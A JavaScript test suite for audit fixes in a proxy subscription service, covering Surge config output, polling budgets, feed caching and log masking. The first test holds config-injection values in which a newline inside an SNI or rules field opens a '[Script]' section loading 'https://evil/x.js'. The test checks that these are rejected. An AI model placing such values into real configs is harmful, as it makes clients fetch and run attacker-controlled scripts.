// 第二轮审计修复：Surge 注入（M3）、轮询子请求预算（M4）、优选重复外拉（M5）、
// 地区列表端口范围（L7）、删除账号的用量条目复活（L8）、快速订阅路径进日志（L9）
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { surgeLinkLine, renderSurge } from '../src/control/sub/surge.js';
import { pollCost, selectBatch } from '../src/control/usage.js';
import { refreshBest, loadBest, bestStaleMs, bestKey, resetBestState } from '../src/control/bestfeed.js';
import { parseNodeList } from '../src/lib/pool-parse.js';
import { DEFAULT_REGION_RE } from '../src/lib/pool-parse.js';
import { createStore, resetStoreState } from '../src/control/store.js';
import { hideKeyPath } from '../src/control/logs.js';
import { settingsWith, memKV } from './helpers.mjs';

test('M3：Surge 链接字段带换行 / 非法主机 / 端口越界时整条丢弃；逗号密码加引号；规则源不能另起段落', () => {
  const base = { type: 'trojan', network: 'ws', server: '1.2.3.4', port: 443, password: 'pw', sni: 'a.com', path: '/ws' };
  assert.equal(surgeLinkLine({ ...base, sni: 'a.com\n\n[Script]\nhttp-request x script-path=https://evil/x.js' }, 'n'), null);
  assert.equal(surgeLinkLine({ ...base, password: 'p\r\nx' }, 'n'), null);
  assert.equal(surgeLinkLine({ ...base, host: 'a.com"x' }, 'n'), null);
  assert.equal(surgeLinkLine({ ...base, server: 'a b' }, 'n'), null);
  assert.equal(surgeLinkLine({ ...base, port: 99999 }, 'n'), null);
  assert.match(surgeLinkLine({ ...base, password: 'a,b' }, 'n'), /password="a,b"/);
  const out = renderSurge({ proxyLines: [], groups: [{ name: 'G', type: 'select', proxies: ['DIRECT'] }], rules: { rules: 'DOMAIN,a.com,G\n[Script]\nx = type=http-request,script-path=https://evil/x.js' }, managedUrl: 'https://x/sub', updateHours: 1 });
  assert.ok(!out.includes('[Script]'));
  assert.ok(out.includes('DOMAIN,a.com,G'));
});

test('M4：子请求按最坏情况计：两种鉴权各试一遍、缓存 ID 失败后重新发现', () => {
  const gk = 'a'.repeat(37);
  const twoWays = { id: 'x', role: 'node', enabled: true, auth: { apiToken: gk, email: 'e@x.com' } };
  assert.equal(pollCost(twoWays, null), 4, '两种方式 × (/accounts + /graphql)');
  assert.equal(pollCost(twoWays, { accountId: 'c' }), 6, '缓存 ID：先各试 1 次，失败再完整发现');
  assert.equal(pollCost({ ...twoWays, auth: { ...twoWays.auth, accountId: 'f'.repeat(32) } }, null), 2);
  const accs = Array.from({ length: 20 }, (_, i) => ({ ...twoWays, id: 'a' + i }));
  const picked = selectBatch(accs, { accounts: {} }, { batchSize: 20, now: 1e12, maxSubrequests: 45 });
  assert.equal(picked.length, 11, '45 / 4');
});

test('M5：Cron 拉到的内容没变也会在快过期时刷新时间戳；KV 数据在过期线内时订阅不外拉', async () => {
  resetBestState();
  const settings = settingsWith({ preferred: { best: { enabled: true, urls: ['https://best.example/list'] } } });
  const kv = memKV();
  const store = createStore({ kv });
  const fetchFn = async () => new Response('1.1.1.1:443#a\n');
  const t0 = 1_800_000_000_000;
  await refreshBest({ store, settings, isp: 'all', fetchFn, now: t0 });
  const writes = kv.writes;
  await refreshBest({ store, settings, isp: 'all', fetchFn, now: t0 + 60e3 });
  assert.equal(kv.writes, writes, '刚写过、内容没变：不写');
  resetStoreState();
  const store2 = createStore({ kv });
  await refreshBest({ store: store2, settings, isp: 'all', fetchFn, now: t0 + bestStaleMs(settings) * 0.6 });
  assert.equal(kv.writes, writes + 1, '快过期：补写时间戳');
  assert.equal(JSON.parse(kv.m.get(bestKey('all'))).fetchedAt, t0 + bestStaleMs(settings) * 0.6);
  // 订阅热路径：KV 里的数据 40 分钟前（旧逻辑 30 分钟就外拉）
  resetBestState();
  resetStoreState();
  let hits = 0;
  const r = await loadBest({ store: createStore({ kv }), settings, isp: 'all', fetchFn: async () => { hits++; return new Response(''); }, now: t0 + bestStaleMs(settings) * 0.6 + 40 * 60e3, waitUntil() {} });
  assert.equal(r.source, 'kv');
  assert.equal(hits, 0);
});

test('L7：地区列表入口端口越界时回退 443', () => {
  const p = parseNodeList('1.2.3.4:99999#新加坡-住宅-01 $socks5://u:p@5.5.5.5:1080', DEFAULT_REGION_RE);
  assert.deepEqual(p.entries, [{ address: '1.2.3.4', port: 443 }]);
});

test('L8：保存用量时剪掉已删除账号，不会被 KV 旧快照带回；重置用量真的清空', async () => {
  resetStoreState();
  const day = new Date(1e12).toISOString().slice(0, 10);
  const kv = memKV({ 'nt.usage': { v: 1, ts: 1, day, accounts: { a: { polledAt: 5, used: 1 }, gone: { polledAt: 5, used: 9 } } } });
  const store = createStore({ kv, now: () => 1e12 });
  await store.saveUsage({ v: 1, ts: 2, day, accounts: { a: { polledAt: 6, used: 2 } } }, { force: true, liveIds: ['a'] });
  assert.deepEqual(Object.keys(JSON.parse(kv.m.get('nt.usage')).accounts), ['a']);
  await store.saveUsage({ v: 1, ts: 3, day, accounts: {} }, { force: true, liveIds: [] });
  assert.deepEqual(JSON.parse(kv.m.get('nt.usage')).accounts, {});
});

test('L9：日志 / TG 里的 /<KEY> 快速订阅路径被遮掉', () => {
  const id = { secretKey: 'my-sub-key', hasCustomKey: true };
  assert.equal(hideKeyPath('https://vp.x/my-sub-key?target=clash', id), 'https://vp.x/***?target=clash');
  assert.equal(hideKeyPath('https://vp.x/my-sub-key', { ...id, hasCustomKey: false }), 'https://vp.x/my-sub-key');
});
